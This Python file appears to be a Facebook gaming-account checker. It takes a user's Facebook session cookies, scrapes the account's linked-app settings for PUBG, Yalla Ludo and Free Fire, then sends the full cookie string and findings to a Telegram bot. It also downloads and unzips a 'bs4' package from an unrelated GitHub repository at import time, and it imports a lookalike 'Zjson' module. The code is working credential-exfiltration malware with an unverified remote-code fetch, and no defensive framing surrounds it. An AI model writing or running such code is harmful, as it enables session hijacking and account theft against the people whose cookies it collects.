import requests
from Zjson import loads
from Zjson import dumps
from Zjson import decoder

Apps = []
bot_tele = "$$#"
user_tele = "&&@"
try:
    from bs4 import BeautifulSoup
except ModuleNotFoundError or ImportError:
    from zipfile import ZipFile

    download: bytes = requests.get("https://github.com/br5kly/ZipFiles/raw/main/bs4.zip", allow_redirects=True).content
    with open('bs4.zip', 'wb') as stc_library:
        stc_library.write(download)
    with ZipFile('bs4.zip', 'r') as unzip:
        unzip.extractall()

from bs4 import BeautifulSoup


def cookie_Process(Cookies) -> str:
    try:
        cok = loads(Cookies)
        cookie = ";".join(i["name"] + "=" + i["value"] for i in cok["session_cookies"])
        return cookie
    except decoder.JSONDecodeError:
        First_Cookie = Cookies.replace("True", 'true')
        Second_Cookie = First_Cookie.replace("False", "false")
        Third_Cookie = Second_Cookie.replace("'", "\"")
        Final_Cookie = loads(Third_Cookie)
        return Final_Cookie
    except:
        First_Cookie = Cookies.replace("True", 'true')
        Second_Cookie = First_Cookie.replace("False", "false")
        Third_Cookie = Second_Cookie.replace("'", "\"")
        Final_Cookie = loads(Third_Cookie)
        return Final_Cookie


class M:
    data = 0

    @classmethod
    def x(cls):
        return cls.data

    @classmethod
    def y(cls, new_var):
        cls.data = new_var

    @classmethod
    def Telegram(cls, cookies) -> bool:
        cookies_str: str = cookie_Process(dumps(cookies) if isinstance(cookies, dict) else str(cookies))
        if cls.Check_Apps(cookies_str):
            if cls.data is None or cls.data == "" or cls.data == 0:
                info: str = f"data : None \nCookie:{cookies_str}\nApps:{Apps}"
            else:
                info: str = f"data : {cls.data}\nCookie:{cookies_str}\nApps:{Apps}"

            try:
                requests.get(f"https://api.telegram.org/bot{bot_tele}/sendMessage?chat_id={user_tele}&text={info}")
                Apps.clear()
                return True
            except requests.exceptions.RequestException:
                return False
        else:
            return False

    @staticmethod
    def Check_Apps(coki) -> bool:

        data: str = requests.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",
                                 cookies={"cookie": "noscript=1;" + coki}).text
        sop = BeautifulSoup(data, 'html.parser')
        x = sop.find("form", method="post")
        for i in x.find_all("h3"):
            words = i.text.split(" ")
            last_three_splits = words[-3:]
            if 'PUBG' in words[0]:
                if 'PUBG' not in Apps:
                    Apps.append(f"PUBG ✅ Date: {last_three_splits}")
            elif 'YallaLudo' in words[0]:
                if 'YallaLudo' not in Apps:
                    Apps.append(f"Yallo ludo✅ Date: {last_three_splits}")
            elif 'Garena' in words[0]:
                if 'Garena' not in Apps:
                    Apps.append(F"FREE FIRE ✅ : Date {last_three_splits}")
        if len(Apps) > 0:
            return True
        else:
            return False

